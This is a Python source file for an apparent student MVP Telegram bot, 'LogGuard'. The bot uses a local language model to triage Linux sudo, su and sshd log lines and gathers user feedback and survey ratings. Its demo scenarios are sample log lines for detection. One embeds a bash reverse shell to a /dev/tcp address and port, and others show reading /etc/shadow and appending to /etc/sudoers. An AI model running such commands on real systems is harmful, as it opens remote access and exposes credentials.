"""LogGuard interactive Telegram bot (MVP demo + user testing).

Features
  /start      intro + demo scenario buttons
  /scenarios  show scenario buttons again
  /survey     5-step rating survey (1-5 scales, yes/maybe/no, free-text comment)
  /help       short help
  any text    treated as a log line -> AI triage with confidence score
  under every verdict: "Real threat" / "False alarm" buttons (user agreement)

Results are appended to agent/results.jsonl and, if configured, to Supabase
tables bot_feedback / bot_surveys (run schema_bot.sql once).

Env vars:
  TELEGRAM_BOT_TOKEN (required)
  LOGGUARD_URL, LOGGUARD_ANON_KEY (optional, for saving to Supabase)
  OLLAMA_URL (default http://127.0.0.1:11434/api/generate), MODEL_NAME (default qwen2.5:3b)
"""
import hashlib
import json
import os
import time
from datetime import datetime, timezone

import requests

TOKEN = os.environ["TELEGRAM_BOT_TOKEN"]
API = f"https://api.telegram.org/bot{TOKEN}"
SB_URL = os.environ.get("LOGGUARD_URL", "").rstrip("/")
SB_KEY = os.environ.get("LOGGUARD_ANON_KEY", "")
OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://127.0.0.1:11434/api/generate")
MODEL_NAME = os.environ.get("MODEL_NAME", "qwen2.5:3b")
RESULTS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results.jsonl")

SYSTEM_PROMPT = """You are LogGuard, an automated Tier-1 SOC Analyst AI.
Analyze the provided Linux authentication/privilege escalation log (sudo, su, sshd).

Classification rules:
1. BENIGN (is_threat: false, severity: "LOW"): Standard admin activities via sudo (e.g., status checks, package updates, normal editing).
2. THREAT (is_threat: true, severity: "MEDIUM" or "HIGH"): Authentication failures, incorrect passwords, brute force.
3. CRITICAL THREAT (is_threat: true, severity: "CRITICAL"): High-risk actions even if authenticated (e.g., accessing /etc/shadow, modifying /etc/sudoers, disabling security tools, reverse shells).

Respond strictly in valid JSON format:
{
  "is_threat": true or false,
  "severity": "LOW" | "MEDIUM" | "HIGH" | "CRITICAL",
  "confidence": integer 0-100 (how sure you are about this verdict),
  "title": "Short incident title in English",
  "explanation": "Clear explanation in English (1-2 sentences)",
  "remediation": "Concrete shell command(s) or steps in English"
}"""

SCENARIOS = {
    "bf":      ("🔐 SSH brute force", "Nov 15 03:47:12 srv01 sshd[4121]: Failed password for root from 185.220.101.47 port 51522 ssh2"),
    "status":  ("✅ Service check (sudo)", "Nov 15 10:02:44 srv01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status nginx"),
    "update":  ("📦 Package update", "Nov 15 10:15:03 srv01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt upgrade -y"),
    "shadow":  ("🕵️ Reading /etc/shadow", "Nov 15 03:52:10 srv01 sudo: staff : TTY=pts/1 ; PWD=/home/staff ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"),
    "sudoers": ("⚠️ Editing sudoers", "Nov 15 03:55:21 srv01 sudo: www-data : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/tee -a /etc/sudoers"),
    "su":      ("🚪 Failed su to root", "Nov 15 14:13:50 srv01 su[2555]: FAILED SU (to root) guest on pts/3"),
    "revsh":   ("💀 Reverse shell", "Nov 15 04:01:33 srv01 sudo: www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/45.155.205.233/4444 0>&1"),
}

SURVEY = [
    ("clarity",  "1/5 · How clear were the AI explanations?", "scale"),
    ("fix",      "2/5 · How useful were the suggested fixes?", "scale"),
    ("accuracy", "3/5 · How often did you agree with the verdict?", "scale"),
    ("use",      "4/5 · Would you use LogGuard at work?", "yesno"),
    ("comment",  "5/5 · What should we improve? Send one message (or /skip).", "text"),
]

sessions = {}   # chat_id -> {"survey": step, "answers": {...}}
last_logs = {}  # short id -> analysis record (for feedback buttons)


# ---------------- helpers ----------------
def tg(method, **data):
    try:
        r = requests.post(f"{API}/{method}", json=data, timeout=35)
        return r.json()
    except Exception as e:
        print("[!] Telegram error:", e)
        return {}


def anon(user_id):
    return hashlib.sha256(f"logguard:{user_id}".encode()).hexdigest()[:12]


def save(kind, record):
    record = {"type": kind, "ts": datetime.now(timezone.utc).isoformat(), **record}
    with open(RESULTS, "a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")
    if SB_URL and SB_KEY:
        table = "bot_feedback" if kind == "feedback" else "bot_surveys"
        row = {k: v for k, v in record.items() if k not in ("type", "ts")}
        try:
            requests.post(f"{SB_URL}/rest/v1/{table}", json=row, timeout=10,
                          headers={"apikey": SB_KEY, "Content-Type": "application/json", "Prefer": "return=minimal"})
        except Exception as e:
            print("[!] Supabase error:", e)


def analyze(line):
    payload = {"model": MODEL_NAME, "system": SYSTEM_PROMPT, "prompt": f"Analyze this log entry:\n{line}",
               "format": "json", "stream": False, "options": {"temperature": 0.0, "num_ctx": 1024}}
    r = requests.post(OLLAMA_URL, json=payload, timeout=90)
    r.raise_for_status()
    return json.loads(r.json().get("response", "{}"))


def esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def scenario_keyboard():
    return {"inline_keyboard": [[{"text": name, "callback_data": f"sc:{key}"}] for key, (name, _) in SCENARIOS.items()]}


# ---------------- flows ----------------
def send_intro(chat):
    tg("sendMessage", chat_id=chat, parse_mode="HTML", reply_markup=scenario_keyboard(), text=(
        "👋 <b>LogGuard — AI Tier-1 security analyst for SMBs</b> (MVP)\n\n"
        "The bot reads a Linux log line (sudo / su / sshd), decides whether it is a threat or noise, "
        "shows the <b>AI confidence</b> and what to do. The final decision is always yours.\n\n"
        "<b>How to try:</b>\n"
        "1. Tap a scenario below, <i>or</i> send your own log line as a message.\n"
        "2. Under each verdict, tell us if you agree.\n"
        "3. Rate the bot at the end: /survey\n\n"
        "ℹ️ Use test data only, not real production logs. Your answers are stored anonymously to evaluate the MVP."))


def triage(chat, user, line, source):
    tg("sendChatAction", chat_id=chat, action="typing")
    t0 = time.time()
    try:
        a = analyze(line)
    except Exception as e:
        tg("sendMessage", chat_id=chat, text=f"⚠️ AI engine is unavailable right now ({type(e).__name__}). Try again in a minute.")
        return
    dt = time.time() - t0
    sev = str(a.get("severity", "LOW")).upper()
    icon = {"LOW": "🟢", "MEDIUM": "🟡", "HIGH": "🟠", "CRITICAL": "🔴"}.get(sev, "⚠️")
    verdict = "THREAT" if a.get("is_threat") else "NOISE (safe)"
    conf = a.get("confidence", "?")
    rid = hashlib.md5(f"{chat}{time.time()}".encode()).hexdigest()[:10]
    last_logs[rid] = {"user": anon(user), "source": source, "log": line, "ai_severity": sev,
                      "ai_is_threat": bool(a.get("is_threat")), "ai_confidence": conf, "latency_s": round(dt, 1)}
    text = (f"{icon} <b>{esc(a.get('title', 'Log analysis'))}</b>\n"
            f"<b>Verdict:</b> {verdict} · <b>Severity:</b> <code>{sev}</code> · <b>AI confidence:</b> <code>{conf}%</code>\n\n"
            f"🧠 <b>AI analysis:</b>\n{esc(a.get('explanation', ''))}\n\n"
            f"🛠 <b>What to do:</b>\n<code>{esc(a.get('remediation', '-'))}</code>\n\n"
            f"📄 <b>Log:</b>\n<code>{esc(line)}</code>\n\n"
            f"⏱ {dt:.1f} s · The decision is yours 👇")
    kb = {"inline_keyboard": [[{"text": "✅ Real threat", "callback_data": f"fb:{rid}:threat"},
                               {"text": "❌ False alarm", "callback_data": f"fb:{rid}:noise"}],
                              [{"text": "🤷 Not sure", "callback_data": f"fb:{rid}:unsure"}]]}
    tg("sendMessage", chat_id=chat, text=text, parse_mode="HTML", reply_markup=kb)


def ask_survey(chat):
    s = sessions[chat]
    key, q, kind = SURVEY[s["survey"]]
    if kind == "scale":
        kb = {"inline_keyboard": [[{"text": str(i), "callback_data": f"sv:{key}:{i}"} for i in range(1, 6)]]}
        tg("sendMessage", chat_id=chat, text=q + "\n(1 = poor, 5 = excellent)", reply_markup=kb)
    elif kind == "yesno":
        kb = {"inline_keyboard": [[{"text": t, "callback_data": f"sv:{key}:{v}"} for t, v in
                                   (("Yes", "yes"), ("Maybe", "maybe"), ("No", "no"))]]}
        tg("sendMessage", chat_id=chat, text=q, reply_markup=kb)
    else:
        tg("sendMessage", chat_id=chat, text=q)


def survey_answer(chat, user, key, value):
    s = sessions.get(chat)
    if not s or "survey" not in s or SURVEY[s["survey"]][0] != key:
        return
    s["answers"][key] = value
    s["survey"] += 1
    if s["survey"] < len(SURVEY):
        ask_survey(chat)
    else:
        rec = {"user": anon(user), **s["answers"]}
        for k in ("clarity", "fix", "accuracy"):
            rec[k] = int(rec[k])
        save("survey", rec)
        sessions.pop(chat, None)
        tg("sendMessage", chat_id=chat, text="🙏 Thank you! Your feedback helps us improve LogGuard.\nTry more scenarios: /scenarios")


# ---------------- update handling ----------------
def on_message(m):
    chat, user = m["chat"]["id"], m["from"]["id"]
    text = (m.get("text") or "").strip()
    if not text:
        return
    s = sessions.get(chat)
    if s and "survey" in s and SURVEY[s["survey"]][2] == "text":
        survey_answer(chat, user, "comment", "" if text == "/skip" else text[:1000])
        return
    cmd = text.split()[0].split("@")[0].lower()
    if cmd == "/start":
        send_intro(chat)
    elif cmd == "/scenarios":
        tg("sendMessage", chat_id=chat, text="Pick a scenario:", reply_markup=scenario_keyboard())
    elif cmd == "/survey":
        sessions[chat] = {"survey": 0, "answers": {}}
        tg("sendMessage", chat_id=chat, text="📝 Quick survey — 5 questions, 1 minute.")
        ask_survey(chat)
    elif cmd == "/help":
        tg("sendMessage", chat_id=chat, text="/scenarios — demo scenarios\n/survey — rate the bot\nOr send any Linux log line.")
    elif cmd.startswith("/"):
        tg("sendMessage", chat_id=chat, text="Unknown command. Try /scenarios or /survey.")
    else:
        triage(chat, user, text[:2000], "custom")


def on_callback(c):
    chat, user, data = c["message"]["chat"]["id"], c["from"]["id"], c["data"]
    tg("answerCallbackQuery", callback_query_id=c["id"])
    if data.startswith("sc:"):
        key = data[3:]
        if key in SCENARIOS:
            triage(chat, user, SCENARIOS[key][1], f"scenario:{key}")
    elif data.startswith("fb:"):
        _, rid, vote = data.split(":")
        rec = last_logs.pop(rid, None)
        if rec is None:
            return
        rec["user_verdict"] = vote
        rec["agree"] = (vote == "threat") == rec["ai_is_threat"] if vote != "unsure" else None
        save("feedback", rec)
        label = {"threat": "real threat", "noise": "false alarm", "unsure": "not sure"}[vote]
        tg("editMessageReplyMarkup", chat_id=chat, message_id=c["message"]["message_id"], reply_markup={"inline_keyboard": []})
        tg("sendMessage", chat_id=chat, text=f"✅ You marked: {label}\nTry another scenario: /scenarios · Rate the bot: /survey")
    elif data.startswith("sv:"):
        _, key, value = data.split(":")
        tg("editMessageReplyMarkup", chat_id=chat, message_id=c["message"]["message_id"], reply_markup={"inline_keyboard": []})
        survey_answer(chat, user, key, value)


def main():
    tg("setMyCommands", commands=[{"command": "start", "description": "Start"},
                                  {"command": "scenarios", "description": "Demo scenarios"},
                                  {"command": "survey", "description": "Rate the bot"},
                                  {"command": "help", "description": "Help"}])
    tg("setMyDescription", description=(
        "🛡 LogGuard — an AI-assisted micro-SOC for small businesses (student MVP).\n\n"
        "The bot acts as a Tier-1 analyst: it reviews Linux auth logs (sudo, su, sshd), decides whether it's a threat "
        "or noise, shows the AI's confidence and suggests what to do. The final decision is always yours.\n\n"
        "Tap Start, pick a demo scenario or send your own log line. Use test data only, never real logs."))
    tg("setMyShortDescription", short_description="AI Tier-1 security analyst for SMBs. Sleep. We're on watch. logguard-web.vercel.app")
    try:
        tags = requests.get(OLLAMA_URL.replace("/api/generate", "/api/tags"), timeout=5).json()
        names = [m["name"] for m in tags.get("models", [])]
        print("[ok] Ollama is running." if MODEL_NAME in names else f"[!] Ollama is running but model {MODEL_NAME} is missing: ollama pull {MODEL_NAME}")
    except Exception:
        print("[!] Ollama is NOT running. Start it: sudo systemctl start ollama")
    print(f"LogGuard bot running (model {MODEL_NAME}). Ctrl+C to stop.")
    offset = 0
    while True:
        try:
            r = requests.get(f"{API}/getUpdates", params={"timeout": 30, "offset": offset}, timeout=40).json()
        except Exception as e:
            print("[!] polling error:", e); time.sleep(3); continue
        for u in r.get("result", []):
            offset = u["update_id"] + 1
            try:
                if "message" in u:
                    on_message(u["message"])
                elif "callback_query" in u:
                    on_callback(u["callback_query"])
            except Exception as e:
                print("[!] handler error:", e)


if __name__ == "__main__":
    main()
